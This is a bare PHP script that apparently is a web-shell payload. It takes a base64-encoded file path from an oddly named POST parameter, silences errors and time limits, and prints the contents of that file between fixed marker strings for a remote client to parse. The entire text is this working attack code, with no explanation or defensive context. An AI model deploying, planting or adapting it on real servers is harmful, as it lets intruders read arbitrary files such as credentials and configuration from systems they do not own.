<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
function asenc($out){
    return $out;
};
function asoutput(){
    $output=ob_get_contents();
    ob_end_clean();
    echo "eb32"."7956";
    echo @asenc($output);
    echo "44e7"."1eb66";}
    ob_start();
    try{
        $F=base64_decode(substr(get_magic_quotes_gpc()?stripslashes($_POST["i18f67606750bc"]):$_POST["i18f67606750bc"],2));
        $fp=@fopen($F,"r");
        if(@fgetc($fp)){
            @fclose($fp);
            @readfile($F);
        }else{
            echo("ERROR:// Can Not Read");
        };
    }catch(Exception $e){
        echo "ERROR://".$e->getMessage();
    };
    asoutput();
    die();
?>